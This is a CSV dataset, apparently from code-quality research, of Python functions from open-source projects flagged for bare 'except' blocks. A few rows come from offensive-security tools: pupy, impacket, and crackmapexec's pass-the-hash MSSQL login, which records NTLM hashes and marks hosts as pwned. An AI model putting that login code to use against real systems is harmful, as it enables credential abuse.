,project,file,function,func_body,anti_pattern,count
0,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/IPython/core/shellapp.py,_run_cmd_line_code,"def _run_cmd_line_code(self):
        """"""Run code or file specified at the command-line""""""
        if self.code_to_run:
            line = self.code_to_run
            try:
                self.log.info(""Running code given at command line (c=): %s"" %
                              line)
                self.shell.run_cell(line, store_history=False)
            except:
                self.log.warning(""Error in executing line in user namespace: %s"" %
                              line)
                self.shell.showtraceback()
                if not self.interact:
                    self.exit(1)

        # Like Python itself, ignore the second if the first of these is present
        elif self.file_to_run:
            fname = self.file_to_run
            if os.path.isdir(fname):
                fname = os.path.join(fname, ""__main__.py"")
            if not os.path.exists(fname):
                self.log.warning(""File '%s' doesn't exist"", fname)
                if not self.interact:
                    self.exit(2)
            try:
                self._exec_file(fname, shell_futures=True)
            except:
                self.shell.showtraceback(tb_offset=4)
                if not self.interact:
                    self.exit(1)",Bare Except Catch Block,1
1,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/pupy/pstore.py,__init__,"def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            if hasattr(os, 'getuid'):
                uid = os.getuid()
            else:
                uid = ''

        seed = '{}:{}'.format(uid, uuid.getnode())

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update('password' + seed)

        self._pstore_key = (h.digest()[:16], '\x00'*16)
        self._pstore = {}

        self.load()",Bare Except Catch Block,1
2,paramiko,/home/r4ph/desenv/phd/exception-miner/projects/py/paramiko/paramiko/primes.py,read_file,"def read_file(self, filename):
        """"""
        :raises IOError: passed from any file operations that fail.
        """"""
        self.pack = {}
        with open(filename, ""r"") as f:
            for line in f:
                line = line.strip()
                if (len(line) == 0) or (line[0] == ""#""):
                    continue
                try:
                    self._parse_modulus(line)
                except:
                    continue",Bare Except Catch Block,1
3,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/DumpNTLMInfo.py,Authenticate,"def Authenticate(self):
        packet = SMB2Packet()
        if self.GetNegotiateResponse()['DialectRevision'] >= SMB2_DIALECT_30:
            packet = SMB3Packet()
        packet['Command'] = SMB2_SESSION_SETUP

        if self._answer.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            self._sessionId = self._answer['SessionID']
            type3, _ = ntlm.getNTLMSSPType3(self._auth, self._respToken['ResponseToken'], '', '', '', '', '')

            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = type3.getData()

            sessionSetup = SMB2SessionSetup()
            sessionSetup['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED
            sessionSetup['SecurityBufferLength'] = len(respToken2)
            sessionSetup['Buffer'] = respToken2.getData()
            packet['Data'] = sessionSetup

            self.send(packet)
            packet = self.receive()

            try:
                return packet.isValidAnswer(STATUS_SUCCESS)
            except:
                return False",Bare Except Catch Block,1
4,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,__saving_work,"def __saving_work(code, coll):

        QA_util_log_info(
            '##JOB07 Now Saving ETF_MIN ==== {}'.format(str(code)),
            ui_log=ui_log
        )
        try:

            for type in ['1min', '5min', '15min', '30min', '60min']:
                ref_ = coll.find({'code': str(code)[0:6], 'type': type})
                end_time = str(now_time())[0:19]
                if ref_.count() > 0:
                    start_time = ref_[ref_.count() - 1]['datetime']

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data[1::])
                            )
                else:
                    start_time = '2015-01-01'

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data)
                            )
        except:
            err.append(code)",Bare Except Catch Block,1
5,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/ipc/simple_worker.py,run_job,"def run_job(
        mod_name, func_name, args=(), kwargs=None, timeout=300,  # seconds
        no_output=False, heartbeat=None, abort=None, module_is_source_code=False
    ):
        ans = {'result':None, 'stdout_stderr':None}
        kwargs = kwargs or {}
        try:
            communicate(ans, w, conn, (mod_name, func_name, args, kwargs,
                module_is_source_code), timeout=timeout, heartbeat=heartbeat,
                abort=abort)
        except WorkerError as e:
            if not no_output:
                e.log_path = w.log_path
            raise
        finally:
            t = Thread(target=w.kill)
            t.daemon=True
            t.start()
            if no_output:
                try:
                    os.remove(w.log_path)
                except:
                    pass
        if not no_output:
            ans['stdout_stderr'] = w.log_path
        return ans",Bare Except Catch Block,1
6,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/classification/vgg16_imagenet/module.py,_set_config,"def _set_config(self):
        """"""
        predictor config setting
        """"""
        cpu_config = AnalysisConfig(self.default_pretrained_model_path)
        cpu_config.disable_glog_info()
        cpu_config.disable_gpu()
        cpu_config.switch_ir_optim(False)
        self.cpu_predictor = create_paddle_predictor(cpu_config)

        try:
            _places = os.environ[""CUDA_VISIBLE_DEVICES""]
            int(_places[0])
            use_gpu = True
        except:
            use_gpu = False
        if use_gpu:
            gpu_config = AnalysisConfig(self.default_pretrained_model_path)
            gpu_config.disable_glog_info()
            gpu_config.enable_use_gpu(memory_pool_init_size_mb=500, device_id=0)
            self.gpu_predictor = create_paddle_predictor(gpu_config)",Bare Except Catch Block,1
7,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,__saving_work,"def __saving_work(code, coll_stock_year):
        try:
            QA_util_log_info(
                '##JOB01 Now Saving STOCK_YEAR==== {}'.format(str(code)),
                ui_log=ui_log
            )

            ref = coll_stock_year.find({'code': str(code)[0:6]})
            end_date = str(now_time())[0:10]
            if ref.count() > 0:
                # 加入这个判断的原因是因为如果股票是刚上市的 数据库会没有数据 所以会有负索引问题出现

                start_date = ref[ref.count() - 1]['date']

                QA_util_log_info(
                    'UPDATE_STOCK_YEAR \n Trying updating {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:
                    coll_stock_year.insert_many(
                        QA_util_to_json_from_pandas(
                            QA_fetch_get_stock_day(
                                str(code),
                                QA_util_get_next_day(start_date),
                                end_date,
                                '00',
                                frequence='year'
                            )
                        )
                    )
            else:
                start_date = '1990-01-01'
                QA_util_log_info(
                    'UPDATE_STOCK_YEAR \n Trying updating {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:
                    coll_stock_year.insert_many(
                        QA_util_to_json_from_pandas(
                            QA_fetch_get_stock_day(
                                str(code),
                                start_date,
                                end_date,
                                '00',
                                frequence='year'
                            )
                        )
                    )
        except:
            err.append(str(code))",Bare Except Catch Block,1
8,crackmapexec,/home/r4ph/desenv/phd/exception-miner/projects/py/crackmapexec/cme/protocols/mssql.py,hash_login,"def hash_login(self, domain, username, ntlm_hash):
        lmhash = """"
        nthash = """"

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find("":"") != -1:
            lmhash, nthash = ntlm_hash.split("":"")
        else:
            nthash = ntlm_hash

        try:
            self.conn.disconnect()
        except:
            pass
        self.create_conn_obj()

        try:
            res = self.conn.login(
                None,
                username,
                """",
                domain,
                "":"" + nthash if not lmhash else ntlm_hash,
                not self.args.local_auth,
            )
            if res is not True:
                self.conn.printReplies()
                return False

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential(""hash"", domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user(""hash"", domain, username, ntlm_hash, self.host)

            out = f""{domain}\\{username} {process_secret(ntlm_hash)} {self.mark_pwned()}""
            self.logger.success(out)
            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except BrokenPipeError as e:
            self.logger.fail(f""Broken Pipe Error while attempting to login"")
            return False
        except Exception as e:
            self.logger.fail(f""{domain}\\{username}:{process_secret(ntlm_hash)} {e}"")
            return False",Bare Except Catch Block,1
9,gooey,/home/r4ph/desenv/exception-miner/projects/py/gooey/gooey/gui/util/time.py,format_interval,"def format_interval(timeValue):
    """"""
    Formats a number of seconds as a clock time, [H:]MM:SS
    Parameters
    ----------
    t  : int
        Number of seconds.
    Returns
    -------
    out  : str
        [H:]MM:SS
    """"""
    # https://github.com/tqdm/tqdm/blob/0cd9448b2bc08125e74538a2aea6af42ee1a7b6f/tqdm/std.py#L228
    try:
        mins, s = divmod(int(timeValue), 60)
        h, m = divmod(mins, 60)
        if h:
            return '{0:d}:{1:02d}:{2:02d}'.format(h, m, s)
        else:
            return '{0:02d}:{1:02d}'.format(m, s)
    except:
        return None",Bare Except Catch Block,1
